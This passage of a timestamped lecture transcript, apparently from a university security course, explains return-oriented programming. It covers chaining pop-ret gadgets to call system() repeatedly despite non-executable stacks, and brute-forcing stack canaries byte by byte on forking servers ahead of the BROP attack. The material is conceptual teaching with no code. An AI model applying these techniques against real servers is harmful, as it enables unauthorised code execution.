towards the full BROP attack,</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>But before you can mention
the full BROP attack,</text_slice>
            </slice>
            <slice>
              <time_slice>44:09</time_slice>
              <text_slice>you've got to
understand how you just</text_slice>
            </slice>
            <slice>
              <time_slice>44:10</time_slice>
              <text_slice>chain together these
preexisting things in the code.</text_slice>
            </slice>
            <slice>
              <time_slice>44:16</time_slice>
              <text_slice>So one thing to note is that
when I'm setting up this return</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>address here, I just said,
eh just put some junk here,</text_slice>
            </slice>
            <slice>
              <time_slice>44:23</time_slice>
              <text_slice>it doesn't really matter,
we just want to get a shell.</text_slice>
            </slice>
            <slice>
              <time_slice>44:25</time_slice>
              <text_slice>But if you're the attacker,
you could actually</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>set this return
address to something</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>that's actually useful, right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:32</time_slice>
              <text_slice>And if you did that, you
could actually string together</text_slice>
            </slice>
            <slice>
              <time_slice>44:35</time_slice>
              <text_slice>several functions, several
function indications in a row,</text_slice>
            </slice>
            <slice>
              <time_slice>44:39</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>That's actually very,
very powerful, right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:42</time_slice>
              <text_slice>Because in particular,
if we literally just</text_slice>
            </slice>
            <slice>
              <time_slice>44:44</time_slice>
              <text_slice>set this return
address to jump, I</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>mean it may be that
when we ret from it,</text_slice>
            </slice>
            <slice>
              <time_slice>44:49</time_slice>
              <text_slice>like the program crashes on
it, maybe we don't want that,</text_slice>
            </slice>
            <slice>
              <time_slice>44:51</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:51</time_slice>
              <text_slice>So can actually start
chaining some of these things</text_slice>
            </slice>
            <slice>
              <time_slice>44:53</time_slice>
              <text_slice>to do interesting stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>44:55</time_slice>
              <text_slice>So let's say that our goal is
that we want to call system</text_slice>
            </slice>
            <slice>
              <time_slice>45:01</time_slice>
              <text_slice>an arbitrary number of times.</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>We don't just want
to do it one time,</text_slice>
            </slice>
            <slice>
              <time_slice>45:04</time_slice>
              <text_slice>we're going to it a
arbitrary number of times.</text_slice>
            </slice>
            <slice>
              <time_slice>45:06</time_slice>
              <text_slice>So how can we do that?</text_slice>
            </slice>
            <slice>
              <time_slice>45:08</time_slice>
              <text_slice>Well, we're going to use
two pieces of information</text_slice>
            </slice>
            <slice>
              <time_slice>45:10</time_slice>
              <text_slice>that we already know
how to get, right.</text_slice>
            </slice>
            <slice>
              <time_slice>45:11</time_slice>
              <text_slice>We already know how to get
the address of system, right.</text_slice>
            </slice>
            <slice>
              <time_slice>45:13</time_slice>
              <text_slice>We just look in GDB and find it.</text_slice>
            </slice>
            <slice>
              <time_slice>45:16</time_slice>
              <text_slice>We also know how to find
the address of that string,</text_slice>
            </slice>
            <slice>
              <time_slice>45:20</time_slice>
              <text_slice>bin flash bash.</text_slice>
            </slice>
            <slice>
              <time_slice>45:21</time_slice>
              <text_slice>Now to actually make this
attack work using multiple calls</text_slice>
            </slice>
            <slice>
              <time_slice>45:25</time_slice>
              <text_slice>to system, we're going to
have to use gadgets, right.</text_slice>
            </slice>
            <slice>
              <time_slice>45:28</time_slice>
              <text_slice>This is getting us
closer to what's</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>taking place in the BROP paper.</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>So what we need to do
now, is find the address</text_slice>
            </slice>
            <slice>
              <time_slice>45:37</time_slice>
              <text_slice>of these two Op codes.</text_slice>
            </slice>
            <slice>
              <time_slice>45:48</time_slice>
              <text_slice>Right, so what is this, so this
is pop in EAX, so what does</text_slice>
            </slice>
            <slice>
              <time_slice>45:51</time_slice>
              <text_slice>this do?</text_slice>
            </slice>
            <slice>
              <time_slice>45:52</time_slice>
              <text_slice>This just takes the
top of the stack</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>and then it puts it
into the EAX register.</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>And what is the ret
instruction going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>46:03</time_slice>
              <text_slice>It just pops the
top of the stack</text_slice>
            </slice>
            <slice>
              <time_slice>46:07</time_slice>
              <text_slice>and then puts it into
EIP, instruction pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>46:15</time_slice>
              <text_slice>OK, so this is what's
known as a gadget, right.</text_slice>
            </slice>
            <slice>
              <time_slice>46:18</time_slice>
              <text_slice>This is like a small set
of assembly instructions</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>that the attacker can use
to build these larger more</text_slice>
            </slice>
            <slice>
              <time_slice>46:24</time_slice>
              <text_slice>grandiose attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>46:25</time_slice>
              <text_slice>OK, So how can we find
this gadget, right.</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>There's actually like
some off the shelf tools</text_slice>
            </slice>
            <slice>
              <time_slice>46:33</time_slice>
              <text_slice>that hackers use to
find these things,</text_slice>
            </slice>
            <slice>
              <time_slice>46:35</time_slice>
              <text_slice>it's not hard to get
the binary, right.</text_slice>
            </slice>
            <slice>
              <time_slice>46:36</time_slice>
              <text_slice>Essentially just
do a [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>46:38</time_slice>
              <text_slice>for these types
of things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>46:39</time_slice>
              <text_slice>So it's just as easy to
find one of these gadgets,</text_slice>
            </slice>
            <slice>
              <time_slice>46:43</time_slice>
              <text_slice>assuming that you've
got a copy of the binary</text_slice>
            </slice>
            <slice>
              <time_slice>46:45</time_slice>
              <text_slice>and we're not worried
about randomization yet.</text_slice>
            </slice>
            <slice>
              <time_slice>46:46</time_slice>
              <text_slice>It's very easy to
find these things.</text_slice>
            </slice>
            <slice>
              <time_slice>46:48</time_slice>
              <text_slice>Just like it's very easy to find
the address of system and stuff</text_slice>
            </slice>
            <slice>
              <time_slice>46:50</time_slice>
              <text_slice>like that.</text_slice>
            </slice>
            <slice>
              <time_slice>46:51</time_slice>
              <text_slice>So if we've got one
of these gadgets,</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>what can we use
this gadget to do?</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>Well of course the
answer is evil.</text_slice>
            </slice>
            <slice>
              <time_slice>46:58</time_slice>
              <text_slice>So, what we can do
is the following.</text_slice>
            </slice>
            <slice>
              <time_slice>47:05</time_slice>
              <text_slice>Let's say that we
changed the stack</text_slice>
            </slice>
            <slice>
              <time_slice>47:09</time_slice>
              <text_slice>so that it looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>47:19</time_slice>
              <text_slice>So the exploit goes this way.</text_slice>
            </slice>
            <slice>
              <time_slice>47:22</time_slice>
              <text_slice>And so let's say, we do this.</text_slice>
            </slice>
            <slice>
              <time_slice>47:26</time_slice>
              <text_slice>So the first thing
we're going to put here</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>is the address of system.</text_slice>
            </slice>
            <slice>
              <time_slice>47:32</time_slice>
              <text_slice>And the thing we're
going to put up here,</text_slice>
            </slice>
            <slice>
              <time_slice>47:35</time_slice>
              <text_slice>is the address of
the pop ret gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>47:45</time_slice>
              <text_slice>Then up here, we're going to
put the address of bash path</text_slice>
            </slice>
            <slice>
              <time_slice>47:58</time_slice>
              <text_slice>and then we're going
to repeat this pattern.</text_slice>
            </slice>
            <slice>
              <time_slice>48:00</time_slice>
              <text_slice>So we're going to put
the address of system,</text_slice>
            </slice>
            <slice>
              <time_slice>48:10</time_slice>
              <text_slice>the address of the
pop ret gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>48:19</time_slice>
              <text_slice>and then the address
of bash path.</text_slice>
            </slice>
            <slice>
              <time_slice>48:29</time_slice>
              <text_slice>OK, so what's going
to happen here now?</text_slice>
            </slice>
            <slice>
              <time_slice>48:31</time_slice>
              <text_slice>Now this is going
to be a bit tricky,</text_slice>
            </slice>
            <slice>
              <time_slice>48:33</time_slice>
              <text_slice>and these lecture
notes are going</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>to be up on the
web, so you may just</text_slice>
            </slice>
            <slice>
              <time_slice>48:36</time_slice>
              <text_slice>want to listen to
what's happening,</text_slice>
            </slice>
            <slice>
              <time_slice>48:38</time_slice>
              <text_slice>but this-- when I first
understood this, this</text_slice>
            </slice>
            <slice>
              <time_slice>48:40</time_slice>
              <text_slice>was like understanding that
Santa Claus wasn't real right.</text_slice>
            </slice>
            <slice>
              <time_slice>48:42</time_slice>
              <text_slice>So what will happen
is-- and by the way,</text_slice>
            </slice>
            <slice>
              <time_slice>48:44</time_slice>
              <text_slice>Santa Claus isn't real, I hope
I didn't ruin it for everyone.</text_slice>
            </slice>
            <slice>
              <time_slice>48:47</time_slice>
              <text_slice>So what's going to happen?</text_slice>
            </slice>
            <slice>
              <time_slice>48:48</time_slice>
              <text_slice>So [INAUDIBLE] is what
puts this in memory.</text_slice>
            </slice>
            <slice>
              <time_slice>48:50</time_slice>
              <text_slice>So we're going to
start here, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>48:52</time_slice>
              <text_slice>So what's going to happen?</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>We're going to return to
system, the ret instruction</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>is going to pop an
entry off the stack, now</text_slice>
            </slice>
            <slice>
              <time_slice>48:59</time_slice>
              <text_slice>the top of the
stack pointers here.</text_slice>
            </slice>
            <slice>
              <time_slice>49:02</time_slice>
              <text_slice>OK, so system is going to
find its argument here,</text_slice>
            </slice>
            <slice>
              <time_slice>49:06</time_slice>
              <text_slice>it's going to execute the shell.</text_slice>
            </slice>
            <slice>
              <time_slice>49:08</time_slice>
              <text_slice>Then it's going to finish
and return to whatever's</text_slice>
            </slice>
            <slice>
              <time_slice>49:11</time_slice>
              <text_slice>here, which is the pop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>49:13</time_slice>
              <text_slice>In executing that
return, we change</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>the top of the stack
pointer to be here.</text_slice>
            </slice>
            <slice>
              <time_slice>49:17</time_slice>
              <text_slice>OK, now we are in
the pop ret gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>OK, so what is that pop
ret gadget going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>49:23</time_slice>
              <text_slice>It's going to pop what's on
the stack, which is this, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>49:26</time_slice>
              <text_slice>So now the top of
the stack is here.</text_slice>
            </slice>
            <slice>
              <time_slice>49:29</time_slice>
              <text_slice>Then we're now in
the ret instruction</text_slice>
            </slice>
            <slice>
              <time_slice>49:31</time_slice>
              <text_slice>from the pop ret gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>49:32</time_slice>
              <text_slice>What's this going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>49:33</time_slice>
              <text_slice>Aha, it's going to call
system again, right.</text_slice>
            </slice>
            <slice>
              <time_slice>49:37</time_slice>
              <text_slice>So once again the ret is going
to pop this off this stack,</text_slice>
            </slice>
            <slice>
              <time_slice>49:41</time_slice>
              <text_slice>we are now in system.</text_slice>
            </slice>
            <slice>
              <time_slice>49:42</time_slice>
              <text_slice>Top of the stack
is here, system is</text_slice>
            </slice>
            <slice>
              <time_slice>49:44</time_slice>
              <text_slice>going-- this will trigger
calling frame, the system.</text_slice>
            </slice>
            <slice>
              <time_slice>49:46</time_slice>
              <text_slice>System takes the bash
path argument here.</text_slice>
            </slice>
            <slice>
              <time_slice>49:49</time_slice>
              <text_slice>OK, and then it is
going to ret, right.</text_slice>
            </slice>
            <slice>
              <time_slice>49:52</time_slice>
              <text_slice>Where's it going to ret to?</text_slice>
            </slice>
            <slice>
              <time_slice>49:53</time_slice>
              <text_slice>The pop ret gadget again.</text_slice>
            </slice>
            <slice>
              <time_slice>49:55</time_slice>
              <text_slice>So the ret pops
the stack, we are</text_slice>
            </slice>
            <slice>
              <time_slice>49:57</time_slice>
              <text_slice>now in the pop ret gadget,
the ret gadget-- sorry,</text_slice>
            </slice>
            <slice>
              <time_slice>50:00</time_slice>
              <text_slice>the pop ret gadget is going to
pop this, so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>50:05</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>50:06</time_slice>
              <text_slice>So clearly we can
chain this sequence</text_slice>
            </slice>
            <slice>
              <time_slice>50:08</time_slice>
              <text_slice>to execute an arbitrary
number of things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:12</time_slice>
              <text_slice>And so this in
essence is starting</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>to get to the core of what
return oriented programming is.</text_slice>
            </slice>
            <slice>
              <time_slice>50:18</time_slice>
              <text_slice>Note that we have not executed
anything in the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:23</time_slice>
              <text_slice>This is what has allowed us to
get beyond those data execution</text_slice>
            </slice>
            <slice>
              <time_slice>50:26</time_slice>
              <text_slice>prevention bits, right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:28</time_slice>
              <text_slice>Nothing's been executed here.</text_slice>
            </slice>
            <slice>
              <time_slice>50:29</time_slice>
              <text_slice>We're just sort of jumping
to things in unexpected ways</text_slice>
            </slice>
            <slice>
              <time_slice>50:33</time_slice>
              <text_slice>to do what we want to do.</text_slice>
            </slice>
            <slice>
              <time_slice>50:35</time_slice>
              <text_slice>OK so this is actually
very, very, very, clever.</text_slice>
            </slice>
            <slice>
              <time_slice>50:39</time_slice>
              <text_slice>And so what's interesting
is that at a high level</text_slice>
            </slice>
            <slice>
              <time_slice>50:41</time_slice>
              <text_slice>you can think about us, we've
now defined this new model</text_slice>
            </slice>
            <slice>
              <time_slice>50:44</time_slice>
              <text_slice>for computation, right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>So in a traditional,
non-malicious program,</text_slice>
            </slice>
            <slice>
              <time_slice>50:48</time_slice>
              <text_slice>you have the
instruction pointer that</text_slice>
            </slice>
            <slice>
              <time_slice>50:50</time_slice>
              <text_slice>points to some linear
sequence of instructions.</text_slice>
            </slice>
            <slice>
              <time_slice>50:52</time_slice>
              <text_slice>And you increment the
instruction pointer</text_slice>
            </slice>
            <slice>
              <time_slice>50:53</time_slice>
              <text_slice>to figure out what's
the next thing to do.</text_slice>
            </slice>
            <slice>
              <time_slice>50:56</time_slice>
              <text_slice>In essence, what return
oriented programing does is,</text_slice>
            </slice>
            <slice>
              <time_slice>50:58</time_slice>
              <text_slice>it uses the stack pointer
as the instruction pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>51:02</time_slice>
              <text_slice>Right, so as we move
the stack pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>we're pointing to like
other blocks of code</text_slice>
            </slice>
            <slice>
              <time_slice>51:09</time_slice>
              <text_slice>that we're going to execute.</text_slice>
            </slice>
            <slice>
              <time_slice>51:10</time_slice>
              <text_slice>And then at the
end of the gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>51:12</time_slice>
              <text_slice>you return back to
the stack pointer</text_slice>
            </slice>
            <slice>
              <time_slice>51:14</time_slice>
              <text_slice>which is then going to tell
us the next block of code</text_slice>
            </slice>
            <slice>
              <time_slice>51:16</time_slice>
              <text_slice>to execute.</text_slice>
            </slice>
            <slice>
              <time_slice>51:17</time_slice>
              <text_slice>OK so that does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>51:26</time_slice>
              <text_slice>So that's basically how you
can avoid the data execution</text_slice>
            </slice>
            <slice>
              <time_slice>51:29</time_slice>
              <text_slice>prevention stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>That's how you can
get around having</text_slice>
            </slice>
            <slice>
              <time_slice>51:32</time_slice>
              <text_slice>this no execute bit on pages.</text_slice>
            </slice>
            <slice>
              <time_slice>51:36</time_slice>
              <text_slice>So the next thing that
we might want to do</text_slice>
            </slice>
            <slice>
              <time_slice>51:38</time_slice>
              <text_slice>is defeat stack canaries.</text_slice>
            </slice>
            <slice>
              <time_slice>51:39</time_slice>
              <text_slice>So if you remember, this
canary was this value</text_slice>
            </slice>
            <slice>
              <time_slice>51:42</time_slice>
              <text_slice>that we were going to
place on the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>51:45</time_slice>
              <text_slice>So you can imagine
the canary would</text_slice>
            </slice>
            <slice>
              <time_slice>51:48</time_slice>
              <text_slice>go right here for
example, or right here,</text_slice>
            </slice>
            <slice>
              <time_slice>51:50</time_slice>
              <text_slice>and it would prevent someone
from overriding the return</text_slice>
            </slice>
            <slice>
              <time_slice>51:53</time_slice>
              <text_slice>address, without also
overwriting the canary.</text_slice>
            </slice>
            <slice>
              <time_slice>51:56</time_slice>
              <text_slice>With the intuition being that
before the system actually</text_slice>
            </slice>
            <slice>
              <time_slice>52:00</time_slice>
              <text_slice>jumps to the ret
address, it can check</text_slice>
            </slice>
            <slice>
              <time_slice>52:02</time_slice>
              <text_slice>to see if the canary
has been changed</text_slice>
            </slice>
            <slice>
              <time_slice>52:04</time_slice>
              <text_slice>in a way that's incorrect.</text_slice>
            </slice>
            <slice>
              <time_slice>52:07</time_slice>
              <text_slice>So that's how the
canary works, but can we</text_slice>
            </slice>
            <slice>
              <time_slice>52:09</time_slice>
              <text_slice>get around the canary?</text_slice>
            </slice>
            <slice>
              <time_slice>52:11</time_slice>
              <text_slice>Can we guess the canary somehow?</text_slice>
            </slice>
            <slice>
              <time_slice>52:13</time_slice>
              <text_slice>Well we can actually, if
we make a few assumptions</text_slice>
            </slice>
            <slice>
              <time_slice>52:17</time_slice>
              <text_slice>about how the system works.</text_slice>
            </slice>
            <slice>
              <time_slice>52:22</time_slice>
              <text_slice>So, how do we defeat
those canaries?</text_slice>
            </slice>
            <slice>
              <time_slice>52:36</time_slice>
              <text_slice>So the first thing that we want
to assume is, that the server,</text_slice>
            </slice>
            <slice>
              <time_slice>52:46</time_slice>
              <text_slice>it has to have a buffer
overflow vulnerability.</text_slice>
            </slice>
            <slice>
              <time_slice>52:53</time_slice>
              <text_slice>The second thing that
we're going to assume,</text_slice>
            </slice>
            <slice>
              <time_slice>52:58</time_slice>
              <text_slice>is that the server is going
to crash and respond, just</text_slice>
            </slice>
            <slice>
              <time_slice>53:07</time_slice>
              <text_slice>restart, if we set the
canary value to a bad one.</text_slice>
            </slice>
            <slice>
              <time_slice>53:19</time_slice>
              <text_slice>And the third thing that
we're going to assume</text_slice>
            </slice>
            <slice>
              <time_slice>53:22</time_slice>
              <text_slice>is that, after the restart,
that the canary and any address</text_slice>
            </slice>
            <slice>
              <time_slice>53:37</time_slice>
              <text_slice>space randomization that you're
doing, is not rerandomized.</text_slice>
            </slice>
            <slice>
              <time_slice>53:49</time_slice>
              <text_slice>Right, so what that
means is that, we're</text_slice>
            </slice>
            <slice>
              <time_slice>53:50</time_slice>
              <text_slice>going to assume that if we can
somehow crash the server, then</text_slice>
            </slice>
            <slice>
              <time_slice>53:53</time_slice>
              <text_slice>when the server restarts,
it's going to have</text_slice>
            </slice>
            <slice>
              <time_slice>53:55</time_slice>
              <text_slice>the same value for the canary.</text_slice>
            </slice>
            <slice>
              <time_slice>53:57</time_slice>
              <text_slice>And it's going to have the same
locations for all the quote</text_slice>
            </slice>
            <slice>
              <time_slice>54:00</time_slice>
              <text_slice>unquote "randomized" stack,
heap and code information</text_slice>
            </slice>
            <slice>
              <time_slice>54:04</time_slice>
              <text_slice>that it has.</text_slice>
            </slice>
            <slice>
              <time_slice>54:05</time_slice>
              <text_slice>So you might wonder why
would this be the case?</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>Why would it be that when
the server comes back</text_slice>
            </slice>
            <slice>
              <time_slice>54:10</time_slice>
              <text_slice>it doesn't have new
locations for things?</text_slice>
            </slice>
            <slice>
              <time_slice>54:12</time_slice>
              <text_slice>The reason is because
a lot of servers</text_slice>
            </slice>
            <slice>
              <time_slice>54:14</time_slice>
              <text_slice>are written to use fork,
to create new processes.</text_slice>
            </slice>
            <slice>
              <time_slice>54:17</time_slice>
              <text_slice>And if you remember,
fork actually</text_slice>
            </slice>
            <slice>
              <time_slice>54:20</time_slice>
              <text_slice>inherits-- the child
inherits the address</text_slice>
            </slice>
            <slice>
              <time_slice>54:23</time_slice>
              <text_slice>space of the address space
layout right of the parent,</text_slice>
            </slice>
            <slice>
              <time_slice>54:27</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>54:27</time_slice>
              <text_slice>This is copy on write pages
that change stuff as the child</text_slice>
            </slice>
            <slice>
              <time_slice>54:30</time_slice>
              <text_slice>updates things, but
if you use fork here,</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>instead of execing
a whole new process,</text_slice>
            </slice>
            <slice>
              <time_slice>54:35</time_slice>
              <text_slice>any time that parent server
process forms new children,</text_slice>
            </slice>
            <slice>
              <time_slice>54:39</time_slice>
              <text_slice>those children will have the
same values of the canary</text_slice>
            </slice>
            <slice>
              <time_slice>54:42</time_slice>
              <text_slice>in the address base, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>54:43</time_slice>
              <text_slice>So these are the
assumptions that we're</text_slice>
            </slice>
            <slice>
              <time_slice>54:44</time_slice>
              <text_slice>going to make to try to
defeat these canaries here.</text_slice>
            </slice>
            <slice>
              <time_slice>54:49</time_slice>
              <text_slice>So how can we defeat the canary?</text_slice>
            </slice>
            <slice>
              <time_slice>54:51</time_slice>
              <text_slice>Well the attack is actually
fairly straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>54:54</time_slice>
              <text_slice>So imagine that the stack
is going up this way, right.</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>Imagine you got the
buffer overflow here,</text_slice>
            </slice>
            <slice>
              <time_slice>55:00</time_slice>
              <text_slice>then imagine that the
canary is up here, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:02</time_slice>
              <text_slice>And the canary actually
has multiple bytes, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:05</time_slice>
              <text_slice>So what you can
actually do is, you</text_slice>
            </slice>
            <slice>
              <time_slice>55:07</time_slice>
              <text_slice>can probe those bytes one by
one and start guessing values</text_slice>
            </slice>
            <slice>
              <time_slice>55:12</time_slice>
              <text_slice>of what those bytes are, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:13</time_slice>
              <text_slice>So let's say that-- so the
canary looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>55:20</time_slice>
              <text_slice>Here's the overflowing
buffer, and you want</text_slice>
            </slice>
            <slice>
              <time_slice>55:24</time_slice>
              <text_slice>to guess what these bytes are.</text_slice>
            </slice>
            <slice>
              <time_slice>55:26</time_slice>
              <text_slice>So the first thing
that you guess</text_slice>
            </slice>
            <slice>
              <time_slice>55:28</time_slice>
              <text_slice>is you take your overflow,
just to this first byte</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>of the canary and you
say, hey, is that byte 0?</text_slice>
            </slice>
            <slice>
              <time_slice>55:34</time_slice>
              <text_slice>You write a 0 there,
with your overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>55:36</time_slice>
              <text_slice>You're either correct
or you're incorrect.</text_slice>
            </slice>
            <slice>
              <time_slice>55:38</time_slice>
              <text_slice>If you are incorrect, then the
server's going to crash, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:43</time_slice>
              <text_slice>If you are correct you
say, aha I actually</text_slice>
            </slice>
            <slice>
              <time_slice>55:45</time_slice>
              <text_slice>know the first byte of
the canary now, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:48</time_slice>
              <text_slice>Then you start guessing here.</text_slice>
            </slice>
            <slice>
              <time_slice>55:49</time_slice>
              <text_slice>You say, are you 0?</text_slice>
            </slice>
            <slice>
              <time_slice>55:51</time_slice>
              <text_slice>Probably not, it's
going to crash.</text_slice>
            </slice>
            <slice>
              <time_slice>55:53</time_slice>
              <text_slice>Are you one?</text_slice>
            </slice>
            <slice>
              <time_slice>55:54</time_slice>
              <text_slice>And maybe not, it's
going to crash.</text_slice>
            </slice>
            <slice>
              <time_slice>55:55</time_slice>
              <text_slice>Are you two?</text_slice>
            </slice>
            <slice>
              <time_slice>55:56</time_slice>
              <text_slice>Aha, it doesn't crash, right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:58</time_slice>
              <text_slice>So now you've actually found
the value of that second canary</text_slice>
            </slice>
            <slice>
              <time_slice>56:01</time_slice>
              <text_slice>byte, right.</text_slice>
            </slice>
            <slice>
              <time_slice>56:02</time_slice>
              <text_slice>As you can imagine,
you step up this way,</text_slice>
            </slice>
            <slice>
              <time_slice>56:04</time_slice>
              <text_slice>and you eventually find all
the values for the canary.</text_slice>
            </slice>
            <slice>
              <time_slice>56:07</time_slice>
              <text_slice>So once again we're taking
advantage of the fact,</text_slice>
            </slice>
            <slice>
              <time_slice>56:09</time_slice>
              <text_slice>that crashes are a signal
to you, the attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>56:12</time_slice>
              <text_slice>that you've actually done
something wrong, right.</text_slice>
            </slice>
            <slice>
              <time_slice>56:15</time_slice>
              <text_slice>And the server is staying
up, in other words,</text_slice>
            </slice>
            <slice>
              <time_slice>56:17</time_slice>
              <text_slice>that socket connection's
staying open, is</text_slice>
            </slice>
            <slice>
              <time_slice>56:19</time_slice>
              <text_slice>a signal to you, the
attacker, that you've</text_slice>
            </slice>
            <slice>
              <time_slice>56:21</time_slice>
              <text_slice>done something right.</text_slice>
            </slice>
            <slice>
              <time_slice>56:22</time_slice>
              <text_slice>AUDIENCE: Maybe I mentioned
something basic here</text_slice>
            </slice>
            <slice>
              <time_slice>56:24</time_slice>
              <text_slice>like why do you-- if you
know how long the canary is,</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>can you just infect directly?</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>Skip that buffer
and overflow those--</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>the one path there the canary?</text_slice>
            </slice>
            <slice>
              <time_slice>56:33</time_slice>
              <text_slice>So like [INAUDIBLE] say you can
like [INAUDIBLE] the canary--</text_slice>
            </slice>
            <slice>
              <time_slice>56:37</time_slice>
              <text_slice>PROFESSOR: Yeah, yeah you
can't-- so that's right</text_slice>
            </slice>
            <slice>
              <time_slice>56:39</time_slice>
              <text_slice>if you-- so if you in fact
know the exact location</text_slice>
            </slice>
            <slice>
              <time_slice>56:41</time_slice>
              <text_slice>of the canary, right.</text_slice>
            </slice>
            <slice>
              <time_slice>56:42</time_slice>
              <text_slice>That can sometimes
allow you to skip</text_slice>
            </slice>
            <slice>
              <time_slice>56:44</time_slice>
              <text_slice>some of these attacks totally.</text_slice>
            </slice>
            <slice>
              <time_slice>56:45</time_slice>
              <text_slice>Because then you
can just directly</text_slice>
            </slice>
            <slice>
              <time_slice>56:46</time_slice>
              <text_slice>write to the return
address, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>56:48</time_slice>
              <text_slice>as opposed to doing some of
this buffer overflow nonsense.</text_slice>
            </slice>
            <slice>
              <time_slice>56:51</time_slice>
              <text_slice>But in general, if there's
some level of randomization</text_slice>
            </slice>
            <slice>
              <time_slice>56:53</time_slice>
              <text_slice>here, if you don't quite know
where the stack is for example,</text_slice>
            </slice>
            <slice>
              <time_slice>56:56</time_slice>
              <text_slice>then it's tricky
to do that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>56:57</time_slice>
              <text_slice>So basically the way
that the attack proceeds</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>is that you don't quite
know what's happening,</text_slice>
            </slice>
            <slice>
              <time_slice>57:01</time_slice>
              <text_slice>and so you just very slowly
creep your way up memory,</text_slice>
            </slice>
            <slice>
              <time_slice>57:06</time_slice>
              <text_slice>down the stack, to figure
out where these things are.</text_slice>
            </slice>
            <slice>
              <time_slice>57:09</time_slice>
              <text_slice>AUDIENCE: Can the
server instead of</text_slice>
            </slice>
            <slice>
              <time_slice>57:11</time_slice>
              <text_slice>crashing when it
finds strong canaries,</text_slice>
            </slice>
            <slice>
              <time_slice>57:13</time_slice>
              <text_slice>keep the socket open and
[INAUDIBLE] deprocess</text_slice>
            </slice>
            <slice>
              <time_slice>57:15</time_slice>
              <text_slice>and [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>57:18</time_slice>
              <text_slice>PROFESSOR: Yeah, so we'll
